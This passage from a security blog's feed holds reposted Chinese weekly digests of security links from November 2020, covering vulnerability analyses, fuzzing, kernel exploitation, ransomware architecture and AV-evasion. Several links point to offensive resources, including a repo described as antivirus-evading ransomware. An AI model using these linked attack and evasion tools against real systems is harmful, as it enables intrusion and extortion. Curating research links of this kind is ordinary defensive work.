Foreign Hashes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sensepost.com&#x2F;blog&#x2F;2020&#x2F;nthashes-and-encodings&#x2F;https:&#x2F;&#x2F;sensepost.com&#x2F;blog&#x2F;2020&#x2F;more-on-foreign-hashes&#x2F;</span><br><span class="line">NT 哈希值分析</span><br></pre></td></tr></table></figure><p>•How to run Windows 10 on ARM in QEMU with Hypervisor.framework patches on Apple Silicon Mac</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gist.github.com&#x2F;niw&#x2F;e4313b9c14e968764a52375da41b4278#file-readme-md</span><br><span class="line">在arm mac上基于qemu运行win10</span><br></pre></td></tr></table></figure><p>•An iOS zero-click radio proximity exploit odyssey</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;12&#x2F;an-ios-zero-click-radio-proximity.html</span><br><span class="line">p0团队关于iOS zero-click漏洞分析</span><br></pre></td></tr></table></figure><p>•IOS 1-DAY HUNTING: UNCOVERING AND EXPLOITING CVE-2020-27950 KERNEL MEMORY LEAK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.synacktiv.com&#x2F;publications&#x2F;ios-1-day-hunting-uncovering-and-exploiting-cve-2020-27950-kernel-memory-leak.htmlCVE-2020-27950 IOS内核内存泄露漏洞分析</span><br></pre></td></tr></table></figure><p>•Linux kernel heap quarantine versus use-after-free exploits</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;a13xp0p0v.github.io&#x2F;2020&#x2F;11&#x2F;30&#x2F;slab-quarantine.html</span><br><span class="line">linux内核heap quarantine以及uaf漏洞利用分析</span><br></pre></td></tr></table></figure><p>•sysdiag-who?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.f-secure.com&#x2F;blog&#x2F;sysdiag-who&#x2F;</span><br><span class="line">macOS sysdiagnose漏洞分析</span><br></pre></td></tr></table></figure><p>•Apple EFI firmware passwords and the SCBO myth</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;reverse.put.as&#x2F;2016&#x2F;06&#x2F;25&#x2F;apple-efi-firmware-passwords-and-the-scbo-myth&#x2F;</span><br><span class="line">苹果EFI固件密码以及SCBO分析</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•Secure Website: From Architecture to Deployment</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.yavs.io&#x2F;Article_18Nov20_SecureWebsite&#x2F;ref&#x2F;reddit_netsec</span><br><span class="line">网站安全：从架构到部署</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.11.23-11.29一周安全知识动态</title>
      <link href="/2020/11/29/%5B%E8%BD%AC%5D2020.11.23-11.29%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/11/29/%5B%E8%BD%AC%5D2020.11.23-11.29%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-11-23-11-29一周安全知识动态"><a href="#2020-11-23-11-29一周安全知识动态" class="headerlink" title="2020.11.23-11.29一周安全知识动态"></a>2020.11.23-11.29一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•DualSense Reverse Engineering</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sensepost.com&#x2F;blog&#x2F;2020&#x2F;dualsense-reverse-engineering&#x2F;</span><br><span class="line">Sony DualSense无线控制器逆向分析</span><br></pre></td></tr></table></figure><h3 id="虚拟化逃逸漏洞相关"><a href="#虚拟化逃逸漏洞相关" class="headerlink" title="虚拟化逃逸漏洞相关"></a>虚拟化逃逸漏洞相关</h3><p>•MMU Virtualization Via Intel EPT – Index</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;revers.engineering&#x2F;mmu-virtualization-via-intel-ept-index&#x2F;</span><br><span class="line">通过Intel EPT 实现MMU Virtualization</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•ImageMagick - Shell injection via PDF password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;insert-script.blogspot.com&#x2F;2020&#x2F;11&#x2F;imagemagick-shell-injection-via-pdf.html</span><br><span class="line">ImageMagick通过pdf 密码实现shell注入漏洞</span><br></pre></td></tr></table></figure><p>•DETAILING SALTSTACK SALT COMMAND INJECTION VULNERABILITIES</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zerodayinitiative.com&#x2F;blog&#x2F;2020&#x2F;11&#x2F;24&#x2F;detailing-saltstack-salt-command-injection-vulnerabilities</span><br><span class="line">SALTSTACK  命令注入漏洞分析</span><br></pre></td></tr></table></figure><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•GEF extension to handle tagged and compressed pointers in v8 better (WIP)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gist.github.com&#x2F;lordidiot&#x2F;1580ddc3474d8f017f2f7972a69727d2</span><br><span class="line">v8的gef插件，可以更好的支持指针压缩</span><br></pre></td></tr></table></figure><p>•Add missing HasValue check in BitfieldCheck::Detect</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;v8&#x2F;v8&#x2F;commit&#x2F;633f67caa6d0a126487a489c240ed86a59b2b291</span><br><span class="line">v8 CVE-2020-16013漏洞commit</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•Exploiting a “Simple” Vulnerability – In 35 Easy Steps or Less!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;windows-internals.com&#x2F;exploiting-a-simple-vulnerability-in-35-easy-steps-or-less&#x2F;</span><br><span class="line">windows CVE-2020-1034漏洞分析</span><br></pre></td></tr></table></figure><p>•Comparing iPhone OS 1.0 with iOS 14 using tree maps</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.timac.org&#x2F;2020&#x2F;1122-comparing-iphone-os-with-ios-14-using-tree-maps&#x2F;</span><br><span class="line">通过tree maps来比较iPhone OS1.0到iOS14</span><br></pre></td></tr></table></figure><p>•Discovering, exploiting and shutting down a dangerous Windows print spooler vulnerability</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.accenture.com&#x2F;us-en&#x2F;blogs&#x2F;cyber-defense&#x2F;discovering-exploiting-shutting-down-dangerous-windows-print-spooler-vulnerability</span><br><span class="line">cve-2020-1030 Windows print spooler 漏洞分析</span><br></pre></td></tr></table></figure><p>•0day in Windows 7 and Server 2008 R2 Gets a Micropatch</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.0patch.com&#x2F;2020&#x2F;11&#x2F;0day-in-windows-7-and-server-2008-r2.html</span><br><span class="line">win7及server 2008提权漏洞分析</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•PC Life After Apple Silicon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mondaynote.com&#x2F;pc-life-after-apple-silicon-a96861f58442</span><br><span class="line">苹果发布芯片后pc市场的分析</span><br></pre></td></tr></table></figure><p>•macOS has checked app signatures online for over 2 years</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;eclecticlight.co&#x2F;2020&#x2F;11&#x2F;25&#x2F;macos-has-checked-app-signatures-online-for-over-2-years&#x2F;</span><br><span class="line">macOS在线验证签名两年之久</span><br></pre></td></tr></table></figure><p>•Architecture of a ransomware (1/2)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;securityshenaningans.medium.com&#x2F;architecture-of-a-ransomware-1-2-1b9fee757fcbhttps:&#x2F;&#x2F;securityshenaningans.medium.com&#x2F;architecture-of-a-ransomware-2-2-e22d8eb11cee</span><br><span class="line">勒索软件架构综合分析</span><br></pre></td></tr></table></figure><p>•Code injection series</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.sevagas.com&#x2F;?-Code-injection-series-</span><br><span class="line">代码注入原理及实现系列文章</span><br></pre></td></tr></table></figure><h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><p>•Patch Diffing with Ghidra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ihack4falafel.github.io&#x2F;Patch-Diffing-with-Ghidra&#x2F;</span><br><span class="line">使用Ghidra来进行补丁比对</span><br></pre></td></tr></table></figure><p>•fpsmt_gpu</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;moyix&#x2F;fpsmt_gpu</span><br><span class="line">brute-force fuzzing floating point SMT on GPUs</span><br></pre></td></tr></table></figure><p>•DbgShell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;DbgShell</span><br><span class="line">基于Powershell实现的windows调试器引擎</span><br></pre></td></tr></table></figure><p>•minizinh0-FUD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gnxbr&#x2F;Fully-Undetectable-Techniques&#x2F;tree&#x2F;main&#x2F;minizinh0-FUD</span><br><span class="line">minizinh0可以绕过杀软的勒索软件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.11.15-11.22一周安全知识动态</title>
      <link href="/2020/11/15/%5B%E8%BD%AC%5D2020.11.15-11.22%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/11/15/%5B%E8%BD%AC%5D2020.11.15-11.22%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-11-15-11-22一周安全知识动态"><a href="#2020-11-15-11-22一周安全知识动态" class="headerlink" title="2020.11.15-11.22一周安全知识动态"></a>2020.11.15-11.22一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•SD-PWN Part 2 — Citrix SD-WAN Center — Another Network Takeover</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;realmodelabs&#x2F;sd-pwn-part-2-citrix-sd-wan-center-another-network-takeover-a9c950a1a27c</span><br><span class="line">Citrix SD-WAN Center漏洞分析</span><br></pre></td></tr></table></figure><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•Modern attacks on the Chrome browser : optimizations and deoptimizations</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;doar-e.github.io&#x2F;blog&#x2F;2020&#x2F;11&#x2F;17&#x2F;modern-attacks-on-the-chrome-browser-optimizations-and-deoptimizations&#x2F;</span><br><span class="line">doar-e 上新的关于v8工作机制以及漏洞Issue1016450分析的文章</span><br></pre></td></tr></table></figure><p>•CVE-2020-17053: Use-After-Free IE Vulnerability</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.trendmicro.com&#x2F;en_us&#x2F;research&#x2F;20&#x2F;k&#x2F;cve-2020-17053-use-after-free-ie-vulnerability.html</span><br><span class="line">CVE-2020-17053 IE UAF漏洞分析</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•restler-fuzzer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;research&#x2F;blog&#x2F;restler-finds-security-and-reliability-bugs-through-automated-fuzzing&#x2F;?OCID&#x3D;msr_blog_restler_twhttps:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;restler-fuzzer</span><br><span class="line">微软开源了 REST API fuzzing工具</span><br></pre></td></tr></table></figure><p>•UAFuzz: Binary-level Directed Fuzzing for Use-After-Free Vulnerabilities</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;securityonline.info&#x2F;uafuzz&#x2F;</span><br><span class="line">目标是挖掘uaf漏洞的fuzz框架</span><br></pre></td></tr></table></figure><p>•NYX: Greybox Hypervisor Fuzzing using Fast Snapshots and Affine Types</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.usenix.org&#x2F;system&#x2F;files&#x2F;sec21summer_schumilo.pdf</span><br><span class="line">usenix Hypervisor fuzz 论文</span><br></pre></td></tr></table></figure><p>•PhD Thesis: Greybox Automatic Exploit Generation for Heap Overflows in Language Interpreters</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sean.heelan.io&#x2F;2020&#x2F;11&#x2F;18&#x2F;phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters&#x2F;</span><br><span class="line">博士论文：关于语言解释器的堆漏洞自动利用</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•CVE-2020-26217: XStream can be used for Remote Code Execution.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;x-stream.github.io&#x2F;CVE-2020-26217.html</span><br><span class="line">CVE-2020-26217: XStream远程代码执行漏洞</span><br></pre></td></tr></table></figure><p>•Attacking JSON Web Tokens (JWTs)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;bugbountywriteup&#x2F;attacking-json-web-tokens-jwts-d1d51a1e17cb</span><br><span class="line">攻击利用 JSON WebToken</span><br></pre></td></tr></table></figure><p>•RCE via Server-Side Template Injection</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cyc10n3.medium.com&#x2F;rce-via-server-side-template-injection-ad46f8e0c2ae</span><br><span class="line">通过Server-Side模版注入实现RCE</span><br></pre></td></tr></table></figure><p>•Consul by HashiCorp: from Infoleak to RCE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lab.wallarm.com&#x2F;consul-by-hashicorp-from-infoleak-to-rce</span><br><span class="line">Consul服务从信息泄露到rce</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•Issue 2073: Samsung NPU (Neural Processing Unit) memory corruption in shared memory parsing</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;project-zero&#x2F;issues&#x2F;detail?id&#x3D;2073</span><br><span class="line">Samsung NPU内存破坏漏洞，可导致提权</span><br></pre></td></tr></table></figure><p>•Jailbreaks Never Die: Exploiting iOS 13.7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cyberweek.ae&#x2F;materials&#x2F;2020&#x2F;D2T1%20-%20Jailbreaks%20Never%20Die%20-%20Exploiting%20iOS%2013.7.pdf</span><br><span class="line">iOS13.7越狱技术介绍slide</span><br></pre></td></tr></table></figure><p>•Running code in the context of iOS Kernel: Part I + LPE POC on iOS 13.7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.zecops.com&#x2F;vulnerabilities&#x2F;running-code-in-the-context-of-ios-kernel-part-i-lpe-poc-on-ios-13-7&#x2F;</span><br><span class="line">iOS内核代码执行</span><br></pre></td></tr></table></figure><h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><p>•MiraclePtr and *Scan - preventing exploitation of UaF bugs (BlinkOn 13)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;ohlxw5kDn-k&amp;list&#x3D;PL9ioqAuyl6UJ_1hPrSWD1LpaIAeF9aaJi&amp;index&#x3D;18</span><br><span class="line">MiraclePtr缓解uaf漏洞的机制</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•Customizing C2-Frameworks for AV-Evasion</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;s3cur3th1ssh1t.github.io&#x2F;Customizing_C2_Frameworks&#x2F;</span><br><span class="line">设计实现过杀软的C2框架</span><br></pre></td></tr></table></figure><p>•Does Apple really log every app you run? A technical look</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.jacopo.io&#x2F;en&#x2F;post&#x2F;apple-ocsp&#x2F;</span><br><span class="line">苹果日志记录分析</span><br></pre></td></tr></table></figure><p>•0day “In the Wild”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.google.com&#x2F;spreadsheets&#x2F;d&#x2F;1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY&#x2F;edit#gid&#x3D;1869060786</span><br><span class="line">谷歌收集的2020年在野0day信息文档</span><br></pre></td></tr></table></figure><p>•Dynamic Invocation in .NET to bypass hooks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.nviso.eu&#x2F;2020&#x2F;11&#x2F;20&#x2F;dynamic-invocation-in-net-to-bypass-hooks&#x2F;</span><br><span class="line">.NET动态调用方法研究</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.11.2-11.15一周安全知识动态</title>
      <link href="/2020/11/02/%5B%E8%BD%AC%5D2020.11.2-11.15%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/11/02/%5B%E8%BD%AC%5D2020.11.2-11.15%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-11-2-11-15一周安全知识动态"><a href="#2020-11-2-11-15一周安全知识动态" class="headerlink" title="2020.11.2-11.15一周安全知识动态"></a>2020.11.2-11.15一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•Moving From Dynamic Emulation of UEFI Modules To Coverage-Guided Fuzzing of UEFI Firmware</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.sentinelone.com&#x2F;moving-from-dynamic-emulation-of-uefi-modules-to-coverage-guided-fuzzing-of-uefi-firmware&#x2F;https:&#x2F;&#x2F;github.com&#x2F;Sentinel-One&#x2F;efi_fuzz</span><br><span class="line">基于反馈的对UEFI固件的fuzz</span><br></pre></td></tr></table></figure><p>•Fuzzing Go package using go-fuzz &amp; libfuzzer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;academy.fuzzinglabs.com&#x2F;fuzzing-go-package-go-fuzz-libfuzzer</span><br><span class="line">使用go-fuzz &amp; libfuzzer 对go package进行fuzz</span><br></pre></td></tr></table></figure><p>•2020 LLVM Developers’ Meeting: E. Stepanov “Memory tagging in LLVM and Android”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;tqG9pr1K5G8</span><br><span class="line">llvm以及安卓中的内存标记技术</span><br></pre></td></tr></table></figure><p>•Instrumenting Adobe Reader with Frida</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;starlabs.sg&#x2F;blog&#x2F;2020&#x2F;11&#x2F;instrumenting-adobe-reader-with-frida&#x2F;</span><br><span class="line">Adobe Reader通过Frida插桩</span><br></pre></td></tr></table></figure><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•Vulnerabilities and tools for the PAX Payment Devices, including D200, S80, S300, S800, S900, S920</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;git.lsd.cat&#x2F;g&#x2F;pax-pwn</span><br><span class="line">PAX支付设备漏洞分析</span><br></pre></td></tr></table></figure><p>•Silver Peak Unity Orchestrator RCE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;realmodelabs&#x2F;silver-peak-unity-orchestrator-rce-2928d65ef749</span><br><span class="line">Silver Peak Unity Orchestrator 代码执行漏洞分析</span><br></pre></td></tr></table></figure><p>•TP-Link Takeover with a Flash Drive</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;tenable-techblog&#x2F;tp-link-takeover-with-a-flash-drive-d493666f6b39</span><br><span class="line">通过usb驱动攻击TP-Link</span><br></pre></td></tr></table></figure><p>•Extraordinary Vulnerabilities Discovered in TCL Android TVs, Now World’s 3rd Largest TV Manufacturer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sick.codes&#x2F;extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer&#x2F;</span><br><span class="line">TCL 安卓TV漏洞分析</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•Fuzzing for eBPF JIT bugs in the Linux kernel</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;scannell.me&#x2F;fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel&#x2F;</span><br><span class="line">eBPF JIT fuzz漏洞挖掘及CVE-2020-27194漏洞分析</span><br></pre></td></tr></table></figure><p>•Using the Linux Audit API to Track Processes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;natanyellin.com&#x2F;posts&#x2F;using-linux-audit-to-track-processes&#x2F;</span><br><span class="line">用Linux Audit API来跟踪进程</span><br></pre></td></tr></table></figure><p>•Detecting Dynamic Loading in Android Applications With /proc/maps</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sayfer.io&#x2F;blog&#x2F;dynamic-loading-in-android-applications-with-proc-maps&#x2F;</span><br><span class="line">通过&#x2F;proc&#x2F;maps来检测Android应用动态加载</span><br></pre></td></tr></table></figure><p>•Booting a macOS Apple Silicon kernel in QEMU</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;worthdoingbadly.com&#x2F;xnuqemu3&#x2F;</span><br><span class="line">用qemu来启动MacOS</span><br></pre></td></tr></table></figure><p>•[Linux Kernel Exploitation 0x0] Debugging the Kernel with QEMU</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.k3170makan.com&#x2F;2020&#x2F;11&#x2F;linux-kernel-exploitation-0x0-debugging.html</span><br><span class="line">linux内核利用系列文章第一篇QEMU调试内核</span><br></pre></td></tr></table></figure><p>•Sleep 